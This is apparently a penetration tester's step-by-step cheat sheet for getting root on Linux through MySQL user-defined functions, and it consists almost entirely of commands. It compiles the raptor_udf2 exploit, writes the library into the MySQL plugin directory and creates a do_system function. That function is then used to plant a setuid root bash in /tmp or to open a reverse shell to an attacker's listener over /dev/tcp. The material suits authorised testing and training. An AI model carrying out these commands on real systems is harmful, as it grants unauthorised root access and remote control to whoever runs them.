# Linux privesc: MySQL UDF

## Check
ps aux | grep mysql
mysql -u '<Username>' -p'<Password>' -e "select @@version, @@plugin_dir; show variables like 'secure_file_priv'; show grants;"
- [ ] mysqld runs as root: otherwise this only gives me the mysql user
- [ ] A login with FILE, and INSERT on the mysql database, usually MySQL's root: :Pb linux-creds to find one
- [ ] secure_file_priv empty: files anywhere mysqld can reach; a folder limits me to it, and NULL to nothing
- [ ] 5.1 or later: the library has to go in @@plugin_dir

## Build the library: raptor_udf2, EDB 1518
On Kali, then into the target's upload/ folder for serve:
searchsploit -m 1518
mv 1518.c raptor_udf2.c
On the target, so its architecture and libc match:
cd /tmp
Then the line serve files gives, and:
gcc -g -c -fPIC raptor_udf2.c
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
chmod 644 raptor_udf2.so
- [ ] No gcc there: the same two lines on Kali, for a 64-bit target, and the .so sent instead

## Load it
mysql -u '<Username>' -p'<Password>' mysql
Inside mysql:
create table pe(line blob);
insert into pe values(load_file('/tmp/raptor_udf2.so'));
select * from pe into dumpfile '/usr/lib/raptor_udf2.so';
- [ ] On 5.1 or later, the @@plugin_dir path in place of /usr/lib, such as /usr/lib/mysql/plugin/raptor_udf2.so
- [ ] load_file gives NULL: the file is not readable by mysqld, or not where secure_file_priv allows
create function do_system returns integer soname 'raptor_udf2.so';
select * from mysql.func;

## Run a command as root
select do_system('cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash');
Then, out of mysql:
/tmp/rootbash -p
Or a shell, with rlwrap nc -lvnp <LPORT> on Kali:
select do_system('bash -c "bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1"');
- [ ] do_system answers 0 and prints nothing: the command still ran

## Afterwards
Inside mysql:
drop function do_system;
drop table pe;
Then:
rm -f /tmp/rootbash /tmp/raptor_udf2.so
- [ ] The library left in the plugin folder noted: only root can remove it
